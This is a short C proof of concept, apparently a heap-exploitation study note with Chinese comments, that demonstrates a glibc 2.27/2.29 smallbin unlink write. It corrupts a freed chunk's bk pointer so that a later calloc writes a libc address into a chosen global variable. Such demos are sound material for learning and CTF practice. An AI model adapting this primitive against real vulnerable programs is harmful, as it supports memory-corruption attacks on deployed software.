// https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3668
// libc: 2.27,2.29 測試成功

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int64_t target;
int main()
{

	for(int i = 0; i<7; ++i)
		free(calloc(0xa0, 1));

	void *small1 = calloc(0xa0, 1);
	malloc(0x10);
	void *small2 = calloc(0xa0,1);
	malloc(0x10);

	free(small1);
	free(small2);

	// small1 2 to small bin
	malloc(0x500);
	// overwirte small1->bk  (smallbin->small2->small1->smallbin)
	*(int64_t *)(small2+8) = (int64_t)(&target)-0x10;
	// tcache count[0xa0] == 6
	malloc(0xa0);

	/*
	 * smallbin -> small2 -> small1
	 * 先把 small1 拿走, 並 unlink => bck->fd = smallbin => target: smallbin 
	 */
	calloc(0xa0, 1);

	printf("target = 0x%lx\n", target);
}
